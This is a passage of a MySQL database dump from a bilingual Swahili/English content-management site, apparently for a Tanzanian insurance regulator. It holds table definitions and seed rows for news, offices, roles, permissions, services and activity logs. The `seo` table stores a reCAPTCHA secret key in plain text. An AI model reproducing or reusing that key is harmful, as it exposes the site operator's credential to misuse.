(4, 'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika', 'Changes in Second Stakeholders General Meetings', '', NULL, '<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-3', '2b72073b6f4749ccd7f2b6a26438a159', '2022-01-02 02:58:21', '2022-06-22 03:50:39'),
(5, 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat.', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat.', '', NULL, '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>', 1, 1, 'lorem-ipsum-dolor-sit-amet-consectetur-adipiscing-elit-donec-mollis-consequat', '359e33e51fe1aa53a3cf522804567a50', '2022-01-08 13:30:30', '2022-06-22 03:51:31');

-- --------------------------------------------------------

--
-- Table structure for table `regional_offices`
--

CREATE TABLE `regional_offices` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `physical_address_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `physical_address_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `toll_free` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `fax` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `latitude` double DEFAULT NULL,
  `longitude` double DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `headquarter` tinyint(1) NOT NULL DEFAULT 0,
  `used_as` smallint(6) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `regional_offices`
--

INSERT INTO `regional_offices` (`id`, `name_en`, `name_sw`, `physical_address_sw`, `physical_address_en`, `phone`, `toll_free`, `fax`, `email`, `content_sw`, `content_en`, `photo_url`, `latitude`, `longitude`, `slug`, `headquarter`, `used_as`, `created_at`, `updated_at`) VALUES
(1, 'HeadQuaters', 'HeadQuaters', 'Dar es Salaam, Tanzania', 'Dar es Salaam, Tanzania', '+255 692261066', NULL, NULL, 'info@swahilicoders.com', NULL, NULL, NULL, NULL, NULL, 'tanzania-national-business-council', 1, 1, '2021-07-28 11:05:10', '2022-10-17 17:04:37');

-- --------------------------------------------------------

--
-- Table structure for table `related_links`
--

CREATE TABLE `related_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(4) DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `related_links`
--

INSERT INTO `related_links` (`id`, `title_sw`, `title_en`, `link`, `url`, `url_external`, `active`, `created_at`, `updated_at`, `parent`, `position`) VALUES
(2, 'Corporate Social Responsibility', 'Corporate Social Responsibility', 1, 'pages/corporate-social-responsibility', NULL, 1, '2021-07-28 06:16:48', '2022-08-10 05:18:48', 0, 1),
(4, 'Institutional Publications', 'Institutional Publications', 1, 'publications', NULL, 1, '2021-07-28 06:17:43', '2022-08-10 05:22:58', 0, 4),
(5, 'Media Center and Events', 'Media Center and Events', 1, 'galleries/listing/photos', NULL, 1, '2021-07-28 06:18:04', '2022-08-10 05:20:26', 0, 2),
(7, 'Reports', 'Reports', 1, 'publications/reports', NULL, 1, '2022-06-22 13:43:29', '2022-08-10 05:22:02', 0, 3);

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `guard_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `name`, `display_name`, `description`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'Administrator', 'Administrator', 'Administrator', 'web', '2021-06-29 06:56:30', '2021-06-29 06:56:30'),
(2, 'Default', 'Default User', 'Default Role', 'web', '2020-06-14 04:30:23', '2022-02-16 13:34:02');

-- --------------------------------------------------------

--
-- Table structure for table `role_has_permissions`
--

CREATE TABLE `role_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `role_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `role_has_permissions`
--

INSERT INTO `role_has_permissions` (`permission_id`, `role_id`) VALUES
(1, 1),
(1, 2),
(2, 1),
(3, 1),
(4, 1),
(5, 1),
(6, 1),
(7, 1),
(8, 1),
(9, 1),
(10, 1),
(11, 1),
(12, 1),
(13, 1),
(14, 1),
(15, 1),
(16, 1),
(17, 1),
(18, 1),
(19, 1),
(20, 1),
(21, 1),
(22, 1),
(23, 1),
(24, 1),
(25, 1),
(26, 1),
(27, 1),
(28, 1),
(29, 1),
(30, 1),
(31, 1),
(32, 1),
(33, 1),
(34, 1),
(35, 1),
(36, 1),
(37, 1),
(38, 1),
(39, 1),
(40, 1),
(41, 1),
(42, 1),
(43, 1),
(44, 1),
(45, 1),
(46, 1),
(47, 1),
(48, 1),
(49, 1),
(50, 1),
(51, 1),
(52, 1),
(53, 1),
(54, 1),
(55, 1),
(56, 1),
(57, 1),
(58, 1),
(59, 1),
(60, 1),
(61, 1),
(62, 1),
(63, 1),
(64, 1),
(65, 1),
(66, 1),
(67, 1),
(68, 1),
(69, 1),
(70, 1),
(71, 1),
(72, 1),
(73, 1),
(74, 1),
(75, 1),
(76, 1),
(77, 1),
(78, 1),
(79, 1),
(80, 1),
(81, 1),
(82, 1),
(83, 1),
(84, 1),
(85, 1),
(86, 1),
(87, 1),
(88, 1),
(89, 1),
(90, 1),
(91, 1),
(92, 1),
(93, 1),
(94, 1),
(95, 1),
(96, 1),
(97, 1),
(98, 1),
(99, 1),
(100, 1),
(101, 1),
(102, 1),
(103, 1),
(104, 1),
(105, 1),
(106, 1),
(107, 1),
(108, 1),
(109, 1),
(110, 1),
(111, 1),
(112, 1),
(113, 1),
(114, 1),
(115, 1),
(116, 1),
(117, 1),
(118, 1),
(119, 1),
(120, 1),
(121, 1),
(122, 1),
(123, 1),
(124, 1),
(125, 1),
(126, 1),
(127, 1),
(128, 1),
(129, 1),
(130, 1),
(131, 1),
(132, 1),
(133, 1),
(134, 1),
(135, 1),
(136, 1),
(137, 1),
(138, 1),
(139, 1),
(140, 1),
(141, 1),
(142, 1),
(143, 1),
(144, 1),
(145, 1),
(146, 1),
(147, 1),
(148, 1),
(149, 1),
(150, 1),
(151, 1),
(152, 1),
(153, 1),
(154, 1),
(155, 1),
(156, 1),
(157, 1),
(158, 1),
(159, 1),
(160, 1),
(161, 1),
(162, 1),
(163, 1),
(164, 1),
(165, 1),
(166, 1),
(167, 1),
(168, 1),
(169, 1),
(170, 1),
(171, 1),
(172, 1),
(173, 1),
(174, 1),
(175, 1),
(176, 1),
(177, 1),
(178, 1),
(179, 1),
(180, 1),
(181, 1),
(182, 1),
(183, 1),
(184, 1),
(185, 1),
(186, 1),
(187, 1),
(188, 1),
(189, 1),
(190, 1),
(191, 1),
(192, 1),
(193, 1),
(194, 1),
(195, 1),
(196, 1),
(197, 1),
(198, 1),
(199, 1),
(200, 1),
(201, 1),
(202, 1),
(203, 1),
(204, 1),
(205, 1),
(206, 1),
(207, 1),
(208, 1),
(209, 1),
(210, 1),
(211, 1),
(212, 1),
(213, 1),
(214, 1),
(215, 1),
(216, 1),
(217, 1),
(218, 1),
(219, 1),
(220, 1),
(221, 1),
(222, 1),
(223, 1),
(224, 1),
(225, 1),
(226, 1),
(227, 1),
(228, 1),
(229, 1),
(230, 1),
(231, 1),
(232, 1),
(233, 1),
(233, 2),
(234, 1),
(234, 2),
(235, 1),
(236, 1),
(237, 1),
(238, 1),
(239, 1),
(240, 1),
(241, 1),
(242, 1),
(243, 1),
(244, 1),
(245, 1),
(246, 1),
(247, 1),
(248, 1),
(249, 1),
(250, 1),
(251, 1),
(252, 1),
(253, 1),
(254, 1),
(255, 1),
(256, 1),
(257, 1),
(258, 1),
(259, 1),
(260, 1),
(261, 1),
(262, 1),
(263, 1),
(264, 1),
(265, 1),
(266, 1),
(267, 1),
(268, 1),
(269, 1),
(270, 1),
(271, 1),
(272, 1),
(273, 1),
(274, 1),
(275, 1),
(276, 1),
(277, 1),
(278, 1),
(279, 1),
(280, 1),
(281, 1),
(282, 1),
(283, 1),
(284, 1),
(285, 1),
(286, 1),
(287, 1),
(288, 1),
(289, 1),
(290, 1),
(291, 1),
(292, 1),
(293, 1),
(294, 1),
(295, 1),
(296, 1),
(297, 1),
(298, 1),
(299, 1),
(300, 1),
(301, 1),
(302, 1),
(303, 1),
(304, 1),
(305, 1),
(306, 1),
(307, 1),
(308, 1),
(309, 1),
(310, 1),
(311, 1),
(312, 1),
(313, 1),
(314, 1),
(315, 1),
(316, 1),
(317, 1),
(318, 1),
(319, 1),
(320, 1),
(321, 1),
(322, 1),
(323, 1),
(324, 1),
(325, 1),
(326, 1),
(327, 1),
(328, 1),
(329, 1),
(330, 1),
(331, 1),
(332, 1),
(333, 1),
(334, 1),
(335, 1),
(336, 1),
(337, 1),
(338, 1),
(339, 1),
(340, 1),
(341, 1),
(342, 1),
(343, 1),
(344, 1),
(345, 1),
(346, 1),
(347, 1),
(348, 1),
(349, 1),
(350, 1),
(351, 1),
(352, 1),
(353, 1),
(354, 1),
(355, 1),
(356, 1),
(357, 1),
(358, 1),
(359, 1),
(360, 1),
(361, 1),
(362, 1),
(363, 1),
(364, 1),
(365, 1),
(366, 1),
(367, 1),
(368, 1),
(369, 1),
(370, 1),
(371, 1),
(372, 1),
(373, 1),
(374, 1),
(375, 1),
(376, 1),
(377, 1),
(378, 1),
(379, 1),
(380, 1),
(381, 1),
(382, 1),
(383, 1),
(384, 1),
(385, 1),
(386, 1),
(387, 1),
(388, 1),
(389, 1),
(390, 1),
(391, 1),
(392, 1),
(393, 1),
(394, 1),
(395, 1),
(396, 1),
(397, 1),
(398, 1),
(399, 1),
(400, 1),
(401, 1),
(402, 1),
(403, 1),
(404, 1),
(405, 1),
(406, 1),
(407, 1),
(408, 1),
(409, 1),
(410, 1),
(411, 1),
(412, 1),
(413, 1),
(414, 1),
(415, 1),
(416, 1),
(417, 1),
(418, 1),
(419, 1),
(420, 1),
(421, 1),
(422, 1),
(423, 1),
(424, 1),
(425, 1);

-- --------------------------------------------------------

--
-- Table structure for table `seo`
--

CREATE TABLE `seo` (
  `id` int(10) UNSIGNED NOT NULL,
  `content_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `keywords_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `keywords_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `recaptcha_site_key` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `recaptcha_secret_key` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `seo`
--

INSERT INTO `seo` (`id`, `content_en`, `content_sw`, `keywords_en`, `keywords_sw`, `created_at`, `updated_at`, `recaptcha_site_key`, `recaptcha_secret_key`) VALUES
(1, 'Government Website', 'Tovuti ya Serikali', 'Government,website', 'Tovuti,serikali', '2021-09-20 03:56:59', '2021-09-20 03:56:59', '6LdK9nIcAAAAAKCjCMNVoNtob9Shvmx7Xkj1qxHY', '6LdK9nIcAAAAAD_MZovQUsH8YNeMtcrwXBX3YWWG');

-- --------------------------------------------------------

--
-- Table structure for table `services`
--

CREATE TABLE `services` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `call_to_action_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Go to Service Now',
  `call_to_action_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Ingia Sasa',
  `url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `icon` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `color` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `specials` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `services`
--

INSERT INTO `services` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `photo_url`, `featured`, `active`, `slug`, `call_to_action_en`, `call_to_action_sw`, `url`, `created_at`, `updated_at`, `user_id`, `icon`, `color`, `specials`) VALUES
(3, 'Tanzania Imports Insurance Portal', 'Tanzania Imports Insurance Portal', NULL, NULL, '<p>Tanzania Imports Insurance Portal</p>', '<p>Tanzania Imports Insurance Portal</p>', 'a4e9a3a9a6d71c0a2440aab1d42e62ca.jpeg', 0, 1, 'tanzania-insurance-portal', 'Go to Service Now', 'Ingia Sasa', 'http://tiip.tira.go.tz', '2021-08-02 05:03:54', '2022-08-12 07:14:06', 0, 'icon-1659878950', NULL, NULL),
(4, 'TIRA MIS Portal', 'TIRA MIS Portal', NULL, NULL, '<p>TIRA MIS Portal</p>', '<p>TIRA MIS Portal</p>', 'd231741ce8c379e18948f846d176d7ec.jpeg', 0, 1, 'tiramis-portal', 'Go to Service Now', 'Ingia Sasa', 'http://tiramis.tira.go.tz/', '2021-08-02 05:05:24', '2022-08-12 07:12:00', 0, 'icon-1659878879', NULL, NULL),
(5, 'TIRA RBS System Portal', 'TIRA RBS System Portal', NULL, NULL, '<p>TIRA RBS System Portal</p>', '<p>TIRA RBS System Portal</p>', 'a4e9a3a9a6d71c0a2440aab1d42e62ca.jpeg', 0, 1, 'tira-rbs-system-portal', 'Go to Service Now', 'Ingia Sasa', 'https://apps.tira.go.tz/TIRARBSPortal/', '2021-09-11 09:24:32', '2022-08-12 07:10:34', 0, 'icon-1659885934', NULL, NULL),
(7, 'Online Registration System(ORS)', 'Online Registration System(ORS)', NULL, NULL, '<p>Online Registration System enable clients to obtain license online</p>', '<p>Online Registration System enable clients to obtain license online</p>', 'a4e9a3a9a6d71c0a2440aab1d42e62ca.jpeg', 0, 1, 'rbss-informations', 'Go to Service Now', 'Ingia Sasa', 'https://ors.tira.go.tz', '2022-03-07 08:01:23', '2022-08-13 19:22:55', 0, 'icon-1659878969', NULL, NULL),
(8, 'Reinsurance Portal', 'Reinsurance Portal', NULL, NULL, '<p>Reinsurance Portal</p>', '<p>Reinsurance Portal</p>', '', 0, 1, 'reinsurance-portal', 'Go to Service now', 'Ingia sasa', 'http://rp.tira.go.tz', '2022-08-13 19:39:12', '2022-08-13 19:39:12', 0, 'icon-1660430352', NULL, NULL),
(9, 'TSS Portal', 'TSS Portal', NULL, NULL, '<p>tss</p>', '<p>tss</p>', '', 0, 1, 'tss-portal', 'Go to Service now', 'Ingia sasa', 'http://tss.tira.go.tz', '2022-08-13 19:43:59', '2022-08-13 19:43:59', 0, 'icon-1660430639', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE `settings` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `social_links`
--

CREATE TABLE `social_links` (
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 0,
  `active` int(11) NOT NULL DEFAULT 1,
  `id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `social_links`
--

INSERT INTO `social_links` (`title_en`, `url`, `created_at`, `updated_at`, `parent`, `position`, `active`, `id`) VALUES
('facebook', 'http://facebook.com', '2021-07-28 05:47:02', '2021-07-28 05:47:02', 0, 0, 1, 1),
('instagram', 'http://instagram.com', '2021-07-28 05:47:44', '2021-07-28 05:47:44', 0, 0, 1, 2),
('youtube', 'https://youtube.com', '2021-07-28 05:49:31', '2021-07-28 05:50:19', 0, 0, 1, 3),
('twitter', 'http://twitter.com', '2021-07-28 05:50:00', '2021-07-28 05:50:00', 0, 0, 1, 4);

-- --------------------------------------------------------

--
-- Table structure for table `special_pages`
--

CREATE TABLE `special_pages` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `speeches`
--

CREATE TABLE `speeches` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_en` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `support_links`
--

CREATE TABLE `support_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `support_links`
--

INSERT INTO `support_links` (`id`, `title_sw`, `title_en`, `link`, `url`, `url_external`, `active`, `parent`, `position`, `created_at`, `updated_at`) VALUES
(1, 'Circulars', 'Circulars', 1, 'publications/circular', NULL, 1, 0, 1, '2022-02-22 10:18:00', '2022-08-10 14:03:52'),
(3, 'Roles of Policy Holders', 'Roles of Policy Holders', 1, 'pages/roles-of-policy-holders', NULL, 1, 0, 1, '2022-02-22 10:18:53', '2022-08-10 14:08:00'),
(4, 'Licensing Requirements', 'Licensing Requirements', 1, 'publications/licensing-requirements', NULL, 1, 0, 1, '2022-06-22 13:39:35', '2022-08-10 14:09:28'),
(5, 'Frequently asked Questions', 'Frequently asked Questions', 1, 'faqs', NULL, 1, 0, 1, '2022-06-22 13:39:54', '2022-08-10 14:10:47');

-- --------------------------------------------------------

--
-- Table structure for table `timelines`
--

CREATE TABLE `timelines` (
  `id` int(10) UNSIGNED NOT NULL,
  `actor` int(11) NOT NULL,
  `object` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `verb` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ip` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `timelines`
--

INSERT INTO `timelines` (`id`, `actor`, `object`, `verb`, `ip`, `url`, `content`, `created_at`, `updated_at`) VALUES
(1, 1, 'Photo', 'store', '127.0.0.1', 'http://127.0.0.1:8000/cms/media', '{\"gallery_id\":3,\"content_sw\":\"Lorem ipsum dolor sit amet consectetur adipisicing elit.\",\"content_en\":\"Lorem ipsum dolor sit amet consectetur adipisicing elit.\",\"status\":\"1\",\"path\":\"\\/uploads\\/gallery\\/\",\"filename\":\"2ab76120eade1e2a4699c43fb30f7a74.jpeg\",\"mime\":\"images\\/jpeg\",\"slug\":\"2ab76120eade1e2a4699c43fb30f7a74-jpeg\"}', '2022-10-19 01:09:49', '2022-10-19 01:09:49'),
(2, 1, 'Photo', 'store', '127.0.0.1', 'http://127.0.0.1:8000/cms/media', '{\"gallery_id\":3,\"content_sw\":\"Lorem ipsum dolor sit amet consectetur adipisicing elit.\",\"content_en\":\"Lorem ipsum dolor sit amet consectetur adipisicing elit.\",\"status\":\"1\",\"path\":\"\\/uploads\\/gallery\\/\",\"filename\":\"998c8395552ec680debbc06bf8557bfe.jpeg\",\"mime\":\"images\\/jpeg\",\"slug\":\"998c8395552ec680debbc06bf8557bfe-jpeg\"}', '2022-10-19 01:10:09', '2022-10-19 01:10:09'),
(3, 1, 'Photo', 'store', '127.0.0.1', 'http://127.0.0.1:8000/cms/media', '{\"gallery_id\":3,\"content_sw\":\"consectetur adipisicingLorem ipsum dolor sit amet  elit.\",\"content_en\":\"consectetur adipisicing Lorem ipsum dolor adipisicing elit.\",\"status\":\"1\",\"path\":\"\\/uploads\\/gallery\\/\",\"filename\":\"697a72eeac98132cf3a487cfa186d0ee.jpeg\",\"mime\":\"images\\/jpeg\",\"slug\":\"697a72eeac98132cf3a487cfa186d0ee-jpeg\"}', '2022-10-19 01:10:43', '2022-10-19 01:10:43'),
